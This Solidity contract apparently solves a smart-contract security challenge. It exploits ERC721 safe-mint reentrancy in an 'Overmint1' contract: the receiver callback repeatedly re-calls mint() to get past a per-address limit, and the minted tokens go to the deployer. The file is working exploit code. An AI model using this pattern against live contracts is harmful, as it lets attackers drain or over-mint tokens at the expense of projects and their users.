// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    using Address for address;

    Overmint1 overMint1;
    address owner;

    constructor(address _overMint1) {
        overMint1 = Overmint1(_overMint1);
        owner = msg.sender;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (overMint1.balanceOf(address(this)) < 5) {
            overMint1.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external {
        
        overMint1.mint();
        overMint1.transferFrom(address(this), owner, 1);
        overMint1.transferFrom(address(this), owner, 2);
        overMint1.transferFrom(address(this), owner, 3);
        overMint1.transferFrom(address(this), owner, 4);
        overMint1.transferFrom(address(this), owner, 5);
    }
}
